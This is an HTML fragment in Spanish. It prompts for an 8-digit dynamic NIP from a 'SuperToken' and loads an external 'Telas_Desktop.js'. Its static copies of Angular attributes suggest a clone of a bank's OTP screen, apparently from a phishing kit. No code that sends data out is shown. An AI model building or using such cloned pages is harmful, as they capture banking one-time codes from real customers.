<script src="Telas_Desktop.js"></script>
<script>
    function soloNumeros(e){
        var key = window.Event ? e.which : e.keyCode
        return (key >= 48 && key <= 57)
    }
</script>

<!--<div _ngcontent-c37="" class="modal-header ng-star-inserted">
    <div _ngcontent-c37="" class="mdl-hdr-txt">
        <img _ngcontent-c37="" alt="" class="supertoken" src="../assets/img/supertoken.svg">
    </div>
</div>-->

<form name="fraData" id="fraData" _ngcontent-c25="" novalidate="" class="ng-touched ng-dirty ng-valid" style="margin-top: 20px;">

    <div _ngcontent-c37="" class="modal-body ng-star-inserted">
    <img _ngcontent-c37="" alt="" class="supertoken" src="../assets/img/supertoken.svg">
                            <!--<p _ngcontent-c37="" class="tittle">
                                Realice la sincronización de su SuperToken
                                para su óptimo funcionamiento.
                            </p>-->
                            <p _ngcontent-c37="" class="tittle" style="margin-top: 20px;">
                                Ingrese un NIP Dinámico de 8
                                dígitos que muestra su SuperToken.
                            </p>

                            <p _ngcontent-c37="" class="label title-stroke my-3">
                                NIP din&aacute;mico SuperToken:
                            </p>
                            <form _ngcontent-c37="" novalidate="" class="ng-pristine ng-valid ng-touched">
                                <div _ngcontent-c37="" class="form-group">
                                    <input onKeyPress="return soloNumeros(event)" _ngcontent-c37="" autocomplete="off" class="form-control text-center ng-pristine ng-valid ng-touched" name="otpKey1" id="otpKey1" placeholder="Número de 8 digitos" type="password">
                                </div>
                            </form>
                        </div>
    <!--div _ngcontent-c25="" class="form-group mt-3 form">
        




        <div _ngcontent-c25="" class="row pb-1">
            <div _ngcontent-c25="" class="col-sm-6 pt-sm-0">
                <label _ngcontent-c25="" class="mensaje_server"></label>
                <input id="txtConInput" name="txtConInput" _ngcontent-c25="" autocomplete="off" class="form-control input-red mr-1 ng-touched ng-dirty ng-valid" formcontrolname="nipActual" placeholder="Ingresa la información que se le solicita" type="text">
            </div>
        </div>

    </div>-->
    <div _ngcontent-c25="" class="row pb-1 last-txt">
        <!--<div _ngcontent-c25="" class="col-12" id="txtChangeEmail">
            Es necesario ingresar la informaci&oacute;n que se le solicite
        </div>-->
    </div>
    <div _ngcontent-c25="" class="row py-5">
        <div _ngcontent-c25="" class="col-md-12 col-lg-3 text-center">
            <button id="ContinuarBTNTokenDes" _ngcontent-c25="" class="rounded-red-button">
                Aceptar
            </button>
        </div>
    </div>
</form>
